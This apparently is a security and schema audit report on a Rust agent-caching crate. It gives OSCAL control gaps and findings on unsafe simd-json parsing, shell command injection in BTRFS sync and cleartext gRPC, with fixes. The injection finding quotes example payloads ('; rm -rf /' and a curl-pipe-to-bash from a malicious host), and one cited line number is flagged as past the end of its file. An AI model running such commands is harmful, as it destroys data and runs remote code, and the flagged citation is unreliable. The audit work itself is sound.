### 1. Schema-as-Code Table

The following table documents places where data contracts, service parameters, or API entities are expressed as ad-hoc Rust structs, untyped JSON structures, or dynamic metadata schemas instead of single-source-of-truth, versioned Protocol Buffer (.proto) schemas or OSCAL models.

| Item | Type | file:line | Has .proto? | Gap |
| :--- | :--- | :--- | :--- | :--- |
| `AgentCapability` | Enum | `crates/op-cache/src/agent_registry.rs:20` | No | Ad-hoc Rust enum with custom Serde snake_case attributes. Employs hand-rolled parsing (`parse`) and naming (`name()`) methods instead of deriving them from a shared schema representation. |
| `AgentPriority` | Enum | `crates/op-cache/src/agent_registry.rs:136` | No | Ad-hoc prioritization enum. Lacks a shared contract schema; relies entirely on local Rust serialization behavior. |
| `AgentDefinition` | Struct | `crates/op-cache/src/agent_registry.rs:149` | No | Ad-hoc metadata container defining agent properties. Duplicates fields and attributes of the proto-generated `Agent` structure used in gRPC. |
| `OrchestrationResult` | Struct | `crates/op-cache/src/orchestrator.rs:40` | No | Internal execution tracing container. Written only in Rust with no machine-readable schema. |
| `StepResult` | Struct | `crates/op-cache/src/orchestrator.rs:54` | No | Ad-hoc structure tracking multi-agent step latency and output properties. |
| `TrackedPattern` | Struct | `crates/op-cache/src/pattern_tracker.rs:40` | No | Ad-hoc layout used to serialize sequential agent patterns inside SQLite databases using raw JSON strings. |
| `PromotionSuggestion` | Struct | `crates/op-cache/src/pattern_tracker.rs:59` | No | Ad-hoc optimization recommendations structure defined without schema versioning. |
| `CachedStepResult` | Struct | `crates/op-cache/src/workflow_cache.rs:47` | No | Ad-hoc workflow cache storage block lacking external validation mapping. |
| `WorkflowPattern` | Struct | `crates/op-cache/src/workflow_tracker.rs:53` | No | Ad-hoc SQLite-backed sequence-tracking pattern representation. |
| `AgentCall` | Struct | `crates/op-cache/src/workflow_tracker.rs:93` | No | Ad-hoc session event-tracking layout for runtime diagnostic analysis. |
| `ToolCallParams` | Struct | `crates/op-cache/src/grpc/mcp_service.rs:304` | No | Untyped container with a `serde_json::Value` field, bypassing compile-time validation for tool parameters. |
| `McpToolJson` | Struct | `crates/op-cache/src/grpc/mcp_service.rs:326` | No | Dynamic serialization structure that expresses schema rules using untyped `serde_json::Value` objects. |

---

### 2. OSCAL Coverage Table

This table maps implemented security-relevant structures (such as database auditing, system backup snapshotting, performance pinning, and external communication gateways) to NIST SP 800-53 security controls, highlighting where automated OSCAL component definitions or policies are missing.

| Control Area | Implemented at file:line | OSCAL Artifact | Gap |
| :--- | :--- | :--- | :--- |
| **CP-9 (System Backup)** | `crates/op-cache/src/snapshot_manager.rs:40` | Component Definition (Missing) | BTRFS subvolume-level cache state snapshot creation and rotation are implemented programmatically but have no matching OSCAL Component Definition to declare backup integrity controls machine-readably. |
| **SI-4 (System Monitoring)** | `crates/op-cache/src/workflow_tracker.rs:114` | Component Definition (Missing) | Logging of sequential agent invocations and latency execution metrics constitutes security monitoring but is not cataloged in machine-readable metadata. |
| **SC-5 (Resource Availability)** | `crates/op-cache/src/numa.rs:71` | Component Definition (Missing) | CPU affinity pinning and custom memory allocation policies constrain platform resource utilization. There is no OSCAL mapping to document these availability safeguards. |
| **SC-8 (Transmission Confidentiality & Integrity)** | `crates/op-cache/src/grpc/server.rs:92` | Component Definition (Missing) | The tonic gRPC server handles cleartext communication by default. There is no OSCAL Component Definition defining boundary transport encryption parameters (such as TLS/mTLS constraints). |
| **CA-3 (Information Exchange / Connections)** | `crates/op-cache/src/grpc/mcp_service.rs:373` | System Security Plan (Missing) | The MCP (Model Context Protocol) JSON-RPC bridge acts as an API boundary executing arbitrary host capabilities. This connection lacks formal representation in an OSCAL System Security Plan (SSP). |
| **AU-12 (Audit Record Generation)** | `crates/op-cache/src/workflow_tracker.rs:136` | Component Definition (Missing) | SQLite database storage of execution context, timestamps, and input hashes constitutes an audit trail, but this mechanism lacks mapping to OSCAL audit profiles. |

---

### 3. Recommendations for Security and Quality Gaps

#### CRITICAL FINDING 1: Heap Buffer Over-read & Undefined Behavior in Unsafe JSON Parsing
*   **File/Line**: `crates/op-cache/src/pattern_tracker.rs:207`, `crates/op-cache/src/workflow_tracker.rs:277`, `crates/op-cache/src/workflow_tracker.rs:320`, `crates/op-cache/src/workflow_tracker.rs:347`
*   **Impact**: Memory corruption, application segmentation faults, or information disclosure.
*   **Description**: The codebase loads JSON strings representing agent sequences from SQLite database queries and parses them using `unsafe { simd_json::from_str(&mut agent_sequence_json) }`. `simd-json` utilizes highly-optimized SIMD vector instructions which load 32-byte or 64-byte chunks. Consequently, `simd-json` strictly requires input buffers to have a padding of at least `simd_json::SIMD_JSON_PADDING` bytes beyond the end of the JSON content. Passing a standard `&mut String` queried directly from a database row violates this safety requirement. When the SIMD parser operates, it can read past the allocated heap boundary of the queried string, triggering a **Heap Buffer Over-read**.
*   **Remediation**:
    1.  Replace the unsafe parsing logic with safe JSON parsing using `serde_json::from_str(&agent_sequence_json)` which is completely memory-safe and does not require custom padding.
    2.  If the parsing performance of `simd-json` is strictly required, clone the string into a `simd_json::PaddedBytes` buffer (or use `simd_json::to_padded_bin`) before invoking the unsafe deserializer to guarantee proper padding.

#### CRITICAL FINDING 2: OS Command Injection in BTRFS Remote Synchronizers
*   **File/Line**: `crates/op-cache/src/btrfs_cache.rs:434`, `crates/op-cache/src/btrfs_cache.rs:475`
*   **Impact**: Remote Code Execution (RCE) with the privileges of the system control plane.
*   **Description**: The methods `stream_to_remote` and `receive_from_remote` format hostname, snapshot names, and paths directly into shell strings executed via `bash -c`:
    ```rust
    let cmd = format!(
        "btrfs send {} | ssh {} 'btrfs receive {}'",
        snapshot_path.display(),
        remote_host,
        remote_path
    );
    ```
    Formatting raw parameters directly into a shell interpreter allows command injection. If an attacker controls or manipulates `remote_host`, `remote_path`, or `remote_snapshot` (for example, via gRPC orchestrator APIs or exposed MCP tools), they can append command delimiters (e.g., `; rm -rf /` or `& curl http://malicious.site | bash`) and execute arbitrary shell commands.
*   **Remediation**:
    1.  Do not use shell invocation (`bash -c`) for executing subsystem commands.
    2.  Refactor execution to use direct binary spawning via `tokio::process::Command`. For example, split the execution into two separate pipelines (or use process piping in Rust) where each string parameter is passed exclusively as an isolated element in the process argument vector:
        ```rust
        let mut send_proc = tokio::process::Command::new("btrfs")
            .args(["send", snapshot_path.to_str().unwrap()])
            .stdout(std::process::Stdio::piped())
            .spawn()?;
        ```
    3.  Enforce strict validation character allowlists (e.g., alphanumeric and safe separators only) for any hostnames or paths before processing.

#### MAJOR FINDING 3: Cleartext gRPC Control Plane Transport
*   **File/Line**: `crates/op-cache/src/grpc/server.rs:92`, `crates/op-cache/src/grpc/server.rs:114`
*   **Impact**: Credentials theft, transaction tampering, and MITM execution of administrative capabilities.
*   **Description**: The gRPC server starts a cleartext listening endpoint on `[::1]:50051`. Because this interface exposes tools, agent registration, caching parameters, and direct executor orchestration (Model Context Protocol), running without transport security violates **SC-8 (Transmission Confidentiality and Integrity)**. If this service is exposed or routed across a local network segment, attackers can intercept intermediate caching payloads and inject forged payloads.
*   **Remediation**:
    1.  Configure the `tonic::transport::Server` with TLS certificate configurations:
        ```rust
        use tonic::transport::{Identity, Server, ServerTlsConfig};
        let cert = std::fs::read_to_string("server.pem")?;
        let key = std::fs::read_to_string("server.key")?;
        let identity = Identity::from_pem(cert, key);
        let tls_config = ServerTlsConfig::new().identity(identity);
        ```
    2.  Utilize Mutual TLS (mTLS) by configuring client certificate validation (`client_ca_root`) to ensure that only authorized control-plane systems can orchestrate agent sequences.

#### MAJOR FINDING 4: Schema Duplication and Mappings Divergence
*   **File/Line**: `crates/op-cache/src/agent_registry.rs:149` (compared with `crates/op-cache/src/grpc/agent_service.rs:15`)
*   **Impact**: Runtime translation failures, serialization mismatch, and structural out-of-sync bugs.
*   **Description**: The platform defines an ad-hoc Rust structural layout (`AgentDefinition`) alongside proto-generated gRPC interface bindings (`Agent`). These models represent the same conceptual entity but are separated into distinct codebases. This dual definition results in translation boilerplate, structural misalignment, and makes the codebase highly fragile when upgrading or evolving either standard.
*   **Remediation**:
    1.  Consolidate representation into the versioned Protobuf specification (.proto file).
    2.  Configure `prost-build` with attributes to derive necessary Serde characteristics or traits directly on the proto-generated Rust structs, establishing a unified "Schema-as-Code" source of truth.

---
## ⚠ Citation Warnings
- `crates/op-cache/src/grpc/mcp_service.rs:373`: file has 368 lines
